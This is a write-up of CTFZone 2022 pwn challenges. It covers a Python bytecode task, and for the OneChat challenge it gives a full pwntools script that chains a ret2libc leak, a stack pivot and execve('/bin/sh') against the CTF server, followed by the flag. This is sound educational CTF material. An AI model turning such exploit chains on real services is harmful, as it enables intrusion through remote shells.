# CTFZone 2022

A 48h CTF Organized by BIZone which took place on August 24–26.

I played as a member of Soteria Team & together, we ranked 22th out of more than 1000 teams.

For this CTF, I've played pwn challenges & they were pretty tough. I've searched & learnt new stuff when dealing with these challenges therefore I really enjoyed this one. I've managed to solve 3 challeges & made progress in the fourth challenge (`stringi`) but I didn't manage to solve it. My favorite challenge for this CTF was [microp](#pwn3 "Writeup"), feel free to check the writeup for more details!

------------

- [Pwn](#pwn)
    -  [Python Bytecode Challenge - Welcome & Part 1](#pwn1 "Writeup")
	-  [OneChat](#pwn2 "Writeup")
    -  [microp](#pwn3 "Writeup")

------------

### Pwn
1. <p name="pwn1"><b>Python Bytecode Challenge - Welcome & Part 1</b> - Medium</p>

For this one, we were given a cli that took care of testing & submitting the solutions. This challenge consist of a set of challenges:

```
Tasks list without names:
- t0-series - 2 tasks - Welcome & guide
- t1-series - 6 tasks - 1 flag - easy-medium
- t2-series - 4 tasks - 1 flag - easy-medium
- t3-series - 3 tasks - 1 flag - medium-hard
- t4-series - 3 tasks - 1 flag - medium
- t5-series - 2 tasks - 1 flag - medium-hard
```

You may check out the cli [here](/2022/CTFZone%202022/source/bc_challenge/) & make sure to check the [guide](/2022/CTFZone%202022/source/bc_challenge/guide). I solved only the `t1-series` challenges therefore the rest of the tasks will be missing from there. The next task was automatically downloaded after solving a task.

The `t0-series` are a tutorial to how to use the cli & get friendly with the environment.

This challenge required a knowledge of Python OpCodes. We were asked to write a function with certain limits, such as opcodes used, the number of opcodes & constantss... And we had to retrieve a secret which could be found in a module or in a variable...

Tasks: [Link](/2022/CTFZone%202022/source/bc_challenge/bc_challenge/tasks/)<br>
Solutions: [Link](/2022/CTFZone%202022/source/bc_challenge/bc_challenge/solutions/)

For this challenge, [Python Documentation](https://docs.python.org/3.9/library/dis.html#python-bytecode-instructions) was good enough to figure out what opcodes to use/remove.

<br>

2. <p name="pwn2"><b>OneChat</b> - Easy</p>

For this one, we had a usual **ret2libc** exploitation, feel free to check the challenge files [here](/2022/CTFZone%202022/source/OneChat/). A binary that reads a `message` & a `name` from the user, both vulnerable to buffer overflow due to the use of `gets` function. Both of them are overflowing in the `add_message` stackframe however, the `message` is copied into the `main` stackframe via an argument passed to the function. Since I used `message` to exploit this **BOF** this caused the payload to overlap with itself, resulting in a part of the payload unuseable which I avoided using a series of pop gadget. To avoid any more problems I decided to stack pivot.

Solver ([Link](/2022/CTFZone%202022/source/OneChat/solve.py))

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chat_patched")
libc = ELF('./libc.so.6')

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("onechat.ctfz.one", 1337)

    return r


def main():
    r = conn()
    
    pop_rdi = 0x00000000004017bb
    add_rsp = 0x0000000000401012
    ret = 0x0000000000401016
    puts = 0x0000000000401050
    pop_3 = 0x00000000004017b6
    writeable = 0x00000000404000 + 0xa00
    leave_ret = 0x00000000004012e3
    
    r.sendline(b'2')
    
    payload = b"A" * 24
    # This is the end of the first rop chain
    payload += p64(pop_rdi) + p64(writeable)
    payload += p64(exe.symbols.gets)
    payload += p64(leave_ret) # Pivot to get a much cleaner payload
    
    assert len(payload) < 136, "Payload len"
    payload += b"a" * (136 - len(payload) - 8)
    
    # first ROP Chain starts here
    payload += p64(writeable) # RBP
    payload += p64(pop_3) # avoid stack values that got edited
    payload += p64(0x9090909090909090)
    payload += p64(0x9090909090909090) # padding
    payload += p64(pop_rdi)
    payload += p64(exe.got.puts)
    payload += p64(exe.plt.puts) # Leak libc
    
    pause()
    
    r.sendline(payload) # Stage one
    r.sendline(b'm'*6)
    
    pause()
    
    payload = b"/bin/sh\0"
    payload += p64(pop_rdi) + p64(exe.got.puts)
    payload += p64(puts)
    payload += p64(pop_rdi) + p64(writeable+8*7)
    payload += p64(exe.symbols.gets)
    
    r.sendline(payload) # Stage two
    
    r.recvuntil(b'u want to add?\n> ')
    leak = u64(r.readline().strip().ljust(8, b'\0'))
    
    print('leak:', hex(leak))
    
    libc_base = leak - libc.symbols.puts
    pop_rdx_rbx = 0x00000000000884a9 + libc_base
    pop_rsi = 0x000000000002b151 + libc_base
    execve = libc_base + libc.symbols.execve
    
    print("libc base:", hex(libc_base))
    
    pause()
    
    payload = p64(pop_rdi) + p64(writeable)
    payload += p64(pop_rdx_rbx) + p64(0) * 2
    payload += p64(pop_rsi) + p64(0)
    payload += p64(execve)
    
    r.sendline(payload) # Stage three
    
    r.interactive()


if __name__ == "__main__":
    main()
```

Flag: `CTFZone{n0_m0n3y_n0_h0n3y_n0_us3rs_n0_pr0b13ms}`

<br>

2. <p name="pwn3"><b>microp</b> - Medium</p>